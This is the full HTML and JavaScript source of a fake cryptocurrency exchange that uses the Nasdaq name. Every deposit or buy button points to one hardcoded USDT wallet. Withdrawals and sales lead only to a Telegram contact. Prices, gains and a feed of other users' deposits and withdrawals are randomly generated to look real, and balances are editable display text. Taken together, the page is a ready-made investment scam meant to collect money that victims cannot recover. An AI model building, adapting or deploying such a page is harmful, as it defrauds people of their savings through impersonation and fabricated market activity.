<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Nasdaq Exchange</title>

<style>
body{margin:0;font-family:Arial;background:#0b0e11;color:white;}

.header{
padding:15px;
font-size:22px;
font-weight:bold;
text-align:center;
}

.box{
background:#161a1e;
margin:12px;
padding:18px;
border-radius:12px;
box-shadow:0 0 10px rgba(0,0,0,0.4);
}

button{
background:#fcd535;
border:none;
padding:10px;
border-radius:6px;
font-weight:bold;
margin:3px;
}

.coin{
display:flex;
justify-content:space-between;
padding:10px;
border-bottom:1px solid #222;
}

.bottom{
position:fixed;
bottom:0;
width:100%;
display:flex;
background:#111;
border-top:1px solid #222;
}

.bottom button{
flex:1;
padding:12px;
color:white;
background:#111;
}

input{width:90%;padding:8px;margin:5px;}
</style>
</head>

<body>

<div class="header">📊 Nasdaq Exchange</div>

<!-- AUTH -->
<div id="auth">
<div class="box">
<h3>Login / Signup</h3>
<input id="user" placeholder="Username"><br>
<input id="pass" type="password" placeholder="Password"><br>
<button onclick="signup()">Signup</button>
<button onclick="login()">Login</button>
</div>
</div>

<!-- HOME -->
<div id="home" style="display:none">
<div class="box">
<h2>Balance: $<span id="balance">1000</span></h2>
<button onclick="buy()">Add Funds</button>
<button onclick="adminAdd()">+ Admin Add</button>
<button onclick="adminRemove()">- Admin Remove</button>
</div>

<div class="box">
<h3>🔥 Hot Coins</h3>
<div id="hotCoins"></div>
</div>
</div>

<!-- MARKET -->
<div id="market" style="display:none">
<div class="box">
<iframe id="chart"
src="https://s.tradingview.com/widgetembed/?symbol=BINANCE:BTCUSDT&theme=dark"
width="100%" height="250"></iframe>
</div>
<div class="box" id="coinList"></div>
</div>

<!-- ASSET -->
<div id="asset" style="display:none">
<div class="box">
<h3>Balance: $<span id="balance2">1000</span></h3>
<button onclick="buy()">Deposit</button>
<button onclick="withdraw()">Withdraw</button>
</div>

<div class="box">
<h3>🔥 Activity</h3>
<div id="activity"></div>
</div>
</div>

<!-- SUPPORT -->
<div id="support" style="display:none">
<div class="box">
<h3>Customer Support</h3>
<button onclick="contact()">Telegram</button>
</div>
</div>

<!-- NAV -->
<div class="bottom">
<button onclick="showPage('home')">Home</button>
<button onclick="showPage('market')">Market</button>
<button onclick="showPage('asset')">Assets</button>
<button onclick="showPage('support')">Support</button>
</div>

<!-- WALLET POPUP -->
<div id="walletPopup" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000000cc;">
<div style="background:#111;margin:50px;padding:20px;border-radius:10px;text-align:center;">
<h3>Deposit USDT (TRC20)</h3>
<img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm">
<p id="walletText">TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm</p>
<button onclick="copyWallet()">Copy</button>
<button onclick="closeWallet()">Close</button>
</div>
</div>

<script>

// USERS SYSTEM
let users = JSON.parse(localStorage.getItem("users")) || {};
let adminUser = "admin";

// SIGNUP
function signup(){
let u=user.value.trim(),p=pass.value.trim();
if(!u||!p)return alert("Fill fields");
if(users[u])return alert("User exists");
users[u]=p;
localStorage.setItem("users",JSON.stringify(users));
alert("Signup success");
}

// LOGIN
function login(){
let u=user.value.trim(),p=pass.value.trim();
if(!users[u])return alert("User not found");
if(users[u]!=p)return alert("Wrong password");
localStorage.setItem("loggedUser",u);
auth.style.display="none";
showPage("home");
}

// AUTO LOGIN
window.onload=function(){
let u=localStorage.getItem("loggedUser");
if(u){
auth.style.display="none";
showPage("home");
}
}

// NAVIGATION
function showPage(p){
["home","market","asset","support"].forEach(x=>document.getElementById(x).style.display="none");
document.getElementById(p).style.display="block";
}

// WALLET
let wallet="TQWTVcqKppmKvx53rdNRbADhRrLbft7Gcm";

function buy(){ walletPopup.style.display="block"; }
function closeWallet(){ walletPopup.style.display="none"; }
function copyWallet(){
navigator.clipboard.writeText(wallet);
alert("Copied ✅");
}

function withdraw(){
alert("Support will contact you 📞");
}

// ADMIN CONTROL
function adminAdd(){
let u = localStorage.getItem("loggedUser");
if(u !== adminUser) return alert("Only admin ❌");
let amt = prompt("Amount");
balance.innerText = parseInt(balance.innerText)+parseInt(amt);
balance2.innerText = balance.innerText;
}

function adminRemove(){
let u = localStorage.getItem("loggedUser");
if(u !== adminUser) return alert("Only admin ❌");
let amt = prompt("Amount");
balance.innerText = parseInt(balance.innerText)-parseInt(amt);
balance2.innerText = balance.innerText;
}

// SUPPORT
function contact(){
window.open("https://t.me/raguadmin");
}

// HOT COINS
let coins=[
"BTC","ETH","BNB","SOL","XRP","ADA","DOGE","TRX","DOT","MATIC",
"LTC","SHIB","AVAX","ATOM","LINK","UNI","XLM","ETC","ICP","FIL",
"APT","ARB","OP","NEAR","ALGO","HBAR","VET","EGLD","SAND","MANA",
"AAVE","GRT","AXS","THETA","XTZ","EOS","KLAY","FLOW","FTM","CHZ"
];

function loadHot(){
hotCoins.innerHTML="";
coins.slice(0,6).forEach(c=>{
let price=(Math.random()*50000).toFixed(2);
let change=(Math.random()*10).toFixed(2);
hotCoins.innerHTML+=`
<div class="coin">
${c}/USDT 
<div style="color:${change>5?'lime':'red'}">+${change}%</div>
<button onclick="buy()">Buy</button>
</div>`;
});
}
loadHot();

// MARKET
function loadMarket(){
coinList.innerHTML="";
coins.forEach(c=>{
let price=(Math.random()*50000).toFixed(2);
coinList.innerHTML+=`
<div class="coin" onclick="changeChart('${c}')">
${c}/USDT $${price}
<div>
<button onclick="buy();event.stopPropagation()">Buy</button>
<button onclick="sell();event.stopPropagation()">Sell</button>
</div>
</div>`;
});
}
loadMarket();

function changeChart(c){
chart.src=`https://s.tradingview.com/widgetembed/?symbol=BINANCE:${c}USDT&theme=dark`;
}

function sell(){
window.open("https://t.me/raguadmin");
}

// ACTIVITY
setInterval(()=>{
let names=["Ali","Ahmed","Sara","Zain"];
let coin=["BTC","ETH","USDT"];
let n=names[Math.floor(Math.random()*4)];
let c=coin[Math.floor(Math.random()*3)];
let amt=Math.floor(Math.random()*2000);
let t=Math.random()>0.5?"deposited":"withdrew";
let color=t=="deposited"?"lime":"red";
activity.innerHTML=`<p style="color:${color}">${n} ${t} $${amt} ${c}</p>`+activity.innerHTML;
},3000);

</script>

</body>
</html>
